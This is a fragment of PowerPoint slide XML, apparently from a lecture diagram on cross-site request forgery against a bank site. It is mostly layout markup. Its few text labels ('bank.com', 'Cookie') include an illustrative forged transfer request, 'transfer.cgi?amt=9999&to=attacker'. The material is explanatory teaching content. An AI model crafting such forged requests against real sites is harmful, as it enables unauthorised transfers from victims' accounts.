            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1831"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Arrow Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3742765" y="4101353"/>
            <a:ext cx="4633632" cy="114300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85016" name="object 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2136122" y="4017309"/>
            <a:ext cx="983316" cy="487456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId9"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="object 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2273394" y="3697941"/>
            <a:ext cx="931489" cy="673774"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="1141553" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="2118" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="11191" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="724"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85018" name="object 31"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1658471" y="3392581"/>
            <a:ext cx="1245254" cy="532279"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId10"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85019" name="object 32"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1692088" y="3437405"/>
            <a:ext cx="1155607" cy="442632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId11"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85020" name="object 33"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1692088" y="3437405"/>
            <a:ext cx="1155607" cy="442632"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T1" fmla="*/ 0 h 501650"/>
              <a:gd name="T2" fmla="*/ 120806 w 1309370"/>
              <a:gd name="T3" fmla="*/ 0 h 501650"/>
              <a:gd name="T4" fmla="*/ 73790 w 1309370"/>
              <a:gd name="T5" fmla="*/ 9436 h 501650"/>
              <a:gd name="T6" fmla="*/ 35396 w 1309370"/>
              <a:gd name="T7" fmla="*/ 35169 h 501650"/>
              <a:gd name="T8" fmla="*/ 9486 w 1309370"/>
              <a:gd name="T9" fmla="*/ 73337 h 501650"/>
              <a:gd name="T10" fmla="*/ 0 w 1309370"/>
              <a:gd name="T11" fmla="*/ 120078 h 501650"/>
              <a:gd name="T12" fmla="*/ 0 w 1309370"/>
              <a:gd name="T13" fmla="*/ 381076 h 501650"/>
              <a:gd name="T14" fmla="*/ 9486 w 1309370"/>
              <a:gd name="T15" fmla="*/ 427816 h 501650"/>
              <a:gd name="T16" fmla="*/ 35396 w 1309370"/>
              <a:gd name="T17" fmla="*/ 465985 h 501650"/>
              <a:gd name="T18" fmla="*/ 73790 w 1309370"/>
              <a:gd name="T19" fmla="*/ 491718 h 501650"/>
              <a:gd name="T20" fmla="*/ 120806 w 1309370"/>
              <a:gd name="T21" fmla="*/ 501154 h 501650"/>
              <a:gd name="T22" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T23" fmla="*/ 501154 h 501650"/>
              <a:gd name="T24" fmla="*/ 1243479 w 1309370"/>
              <a:gd name="T25" fmla="*/ 491718 h 501650"/>
              <a:gd name="T26" fmla="*/ 1281884 w 1309370"/>
              <a:gd name="T27" fmla="*/ 465985 h 501650"/>
              <a:gd name="T28" fmla="*/ 1307775 w 1309370"/>
              <a:gd name="T29" fmla="*/ 427816 h 501650"/>
              <a:gd name="T30" fmla="*/ 1317269 w 1309370"/>
              <a:gd name="T31" fmla="*/ 381076 h 501650"/>
              <a:gd name="T32" fmla="*/ 1317269 w 1309370"/>
              <a:gd name="T33" fmla="*/ 120078 h 501650"/>
              <a:gd name="T34" fmla="*/ 1307775 w 1309370"/>
              <a:gd name="T35" fmla="*/ 73337 h 501650"/>
              <a:gd name="T36" fmla="*/ 1281884 w 1309370"/>
              <a:gd name="T37" fmla="*/ 35169 h 501650"/>
              <a:gd name="T38" fmla="*/ 1243479 w 1309370"/>
              <a:gd name="T39" fmla="*/ 9436 h 501650"/>
              <a:gd name="T40" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T41" fmla="*/ 0 h 50165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1309370" h="501650">
                <a:moveTo>
                  <a:pt x="1189205" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="120081" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73340" y="9436"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35171" y="35169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9436" y="73337"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="120078"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="381076"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9436" y="427816"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35171" y="465985"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73340" y="491718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120081" y="501154"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1189205" y="501154"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1235953" y="491718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1274125" y="465985"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1299860" y="427816"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1309296" y="381076"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1309296" y="120078"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1299860" y="73337"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1274125" y="35169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1235953" y="9436"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1189205" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85021" name="object 34"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1802747" y="3529853"/>
            <a:ext cx="937091"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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1500">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
